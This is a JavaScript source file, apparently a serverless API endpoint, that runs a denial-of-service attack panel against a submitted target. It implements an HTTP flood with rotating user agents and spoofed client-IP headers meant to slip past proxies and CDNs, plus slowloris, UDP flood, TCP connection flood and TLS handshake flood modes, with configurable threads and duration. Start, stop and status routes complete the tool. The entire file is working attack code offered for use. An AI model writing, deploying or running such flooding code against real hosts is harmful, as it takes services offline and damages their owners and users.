import https from 'https';
import http from 'http';
import net from 'net';
import dgram from 'dgram';
import tls from 'tls';
import { URL } from 'url';
import { cors, ratelimit, originGuard, tokenGuard, validateTarget, sanitize } from './_guard.js';

let STATE = {
  running:false, req:0, err:0, rps:0, threads:0,
  logs:[], lastReq:0, startTs:0, endTs:0,
  target:'', method:''
};
let ABORT = false;

const UA_POOL = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1 Safari/605.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1 Mobile/15E148',
  'curl/8.5.0','python-requests/2.31','Go-http-client/2.0'
];

function rUA(){ return UA_POOL[Math.floor(Math.random()*UA_POOL.length)]; }
function log(msg, cls='info'){ STATE.logs.push({msg,cls,t:Date.now()}); if(STATE.logs.length>300) STATE.logs.shift(); }

function buildAgent(proto){
  if(proto==='https:') return new https.Agent({ rejectUnauthorized:false, keepAlive:true, maxSockets:2048, maxFreeSockets:1024 });
  return new http.Agent({ keepAlive:true, maxSockets:2048, maxFreeSockets:1024 });
}

/* ---------- HTTP FLOOD (L7) ---------- */
function httpFlood(u, duration){
  const agent = buildAgent(u.protocol);
  const mod   = u.protocol==='https:' ? https : http;
  const paths = ['/','/?r='+Math.random(),'/api','/login','/search?q='+Math.random().toString(36),'/index.html','/.env','/admin'];
  const end   = Date.now()+duration*1000;

  const fire = () => {
    if(ABORT || !STATE.running || Date.now()>end) return;
    const path = paths[Math.floor(Math.random()*paths.length)];
    const spoof = Array.from({length:4},()=>Math.floor(Math.random()*255)).join('.');
    const r = mod.request({
      hostname:u.hostname, port:u.port||(u.protocol==='https:'?443:80),
      path, method: Math.random()<.3 ? 'POST' : 'GET',
      headers:{
        'User-Agent': rUA(),
        'Accept':'*/*','Accept-Language':'en-US,en;q=0.9',
        'Connection':'keep-alive','Cache-Control':'no-cache',
        'X-Forwarded-For': spoof,
        'X-Real-IP': spoof,
        'CF-Connecting-IP': spoof,
        'Referer': `https://${u.hostname}/`
      },
      agent, timeout: 6000
    }, res => {
      STATE.req++;
      res.on('data',()=>{});
      res.on('end',()=>{});
    });
    r.on('error',()=>STATE.err++);
    r.on('timeout',()=>{ r.destroy(); STATE.err++; });
    if(Math.random()<.3) r.write('x='+'a'.repeat(2048));
    r.end();
    setImmediate(fire);
  };
  for(let i=0;i<STATE.threads;i++) setImmediate(fire);
}

/* ---------- SLOWLORIS (L7 keepalive) ---------- */
function slowloris(u, duration){
  const port = u.port || (u.protocol==='https:'?443:80);
  const end  = Date.now()+duration*1000;

  const open = () => {
    if(ABORT || !STATE.running || Date.now()>end) return;
    const sock = net.connect(port, u.hostname, () => {
      sock.write(`GET ${u.pathname||'/'} HTTP/1.1\r\nHost: ${u.hostname}\r\n`);
      sock.write(`User-Agent: ${rUA()}\r\n`);
      const iv = setInterval(() => {
        if(ABORT || !STATE.running || Date.now()>end){ clearInterval(iv); sock.destroy(); return; }
        sock.write(`X-${Math.random().toString(36).slice(2,8)}: ${Math.random()}\r\n`);
        STATE.req++;
      }, 7000);
      sock.on('close', ()=>clearInterval(iv));
    });
    sock.on('error',()=>STATE.err++);
    setTimeout(open, 250);
  };
  for(let i=0;i<STATE.threads;i++) open();
}

/* ---------- UDP FLOOD (L4) ---------- */
function udpFlood(u, duration){
  const port = +u.port || 80;
  const end  = Date.now()+duration*1000;
  const payload = Buffer.alloc(1472, 0x41);

  const fire = () => {
    if(ABORT || !STATE.running || Date.now()>end) return;
    const s = dgram.createSocket('udp4');
    s.send(payload, 0, payload.length, port, u.hostname, err => {
      if(err) STATE.err++; else STATE.req++;
      s.close();
    });
    setImmediate(fire);
  };
  for(let i=0;i<STATE.threads;i++) setImmediate(fire);
}

/* ---------- SYN FLOOD (L4 raw-ish) ---------- */
function synFlood(u, duration){
  const port = +u.port || 80;
  const end  = Date.now()+duration*1000;

  const fire = () => {
    if(ABORT || !STATE.running || Date.now()>end) return;
    const s = new net.Socket();
    s.setTimeout(1500, ()=>s.destroy());
    s.connect(port, u.hostname, ()=>{ STATE.req++; s.destroy(); });
    s.on('error',()=>{ STATE.err++; s.destroy(); });
    setImmediate(fire);
  };
  for(let i=0;i<STATE.threads;i++) setImmediate(fire);
}

/* ---------- TLS HELLO FLOOD ---------- */
function tlsFlood(u, duration){
  const port = +u.port || 443;
  const end  = Date.now()+duration*1000;

  const fire = () => {
    if(ABORT || !STATE.running || Date.now()>end) return;
    const s = tls.connect({ host:u.hostname, port, rejectUnauthorized:false, servername:u.hostname }, () => {
      STATE.req++; s.destroy();
    });
    s.on('error',()=>{ STATE.err++; s.destroy(); });
    s.setTimeout(2000, ()=>s.destroy());
    setImmediate(fire);
  };
  for(let i=0;i<STATE.threads;i++) setImmediate(fire);
}

/* ---------- HANDLER ---------- */
export default async function handler(req, res){
  if(!cors(req,res)) return;
  if(!originGuard(req,res)) return;
  if(!ratelimit(req,res)) return;
  if(!tokenGuard(req,res)) return;

  if(req.method==='POST'){
    const body = req.body || {};
    const target  = validateTarget(body.target);
    const method  = sanitize(body.method || 'http');
    const threads = Math.min(Math.max(+body.threads||256, 1), 5000);
    const duration= Math.min(Math.max(+body.duration||30, 1), 300);

    if(!target) return res.status(400).json({ error:'invalid target' });

    ABORT = false;
    STATE = { running:true, req:0, err:0, rps:0, threads, logs:[], lastReq:0, startTs:Date.now(), endTs:Date.now()+duration*1000, target, method };
    log(`spawn ${method.toUpperCase()} → ${target} | t=${threads} d=${duration}s`, 'ok');

    const u = new URL(target);
    const runner = { http:httpFlood, slowloris, udp:udpFlood, syn:synFlood, tls:tlsFlood }[method] || httpFlood;
    try { runner(u, duration); } catch(e){ log('runner error: '+e.message,'err'); }

    const monitor = setInterval(() => {
      const now = Date.now();
      STATE.rps = Math.round(STATE.req / ((now - STATE.startTs)/1000 || 1));
      if(ABORT || now > STATE.endTs){
        clearInterval(monitor);
        STATE.running = false;
        log('attack selesai.','ok');
      }
    }, 1000);

    return res.json({ ok:true, workers:threads, method, duration, target });
  }

  if(req.method==='DELETE'){
    ABORT = true; STATE.running = false;
    log('dihentikan manual.','warn');
    return res.json({ stopped:true });
  }

  if(req.method==='GET'){
    const logs = STATE.logs.splice(0, STATE.logs.length);
    return res.json({
      running: STATE.running, req: STATE.req, err: STATE.err,
      rps: STATE.rps, threads: STATE.threads, logs
    });
  }

  res.status(405).json({ error:'method not allowed' });
}
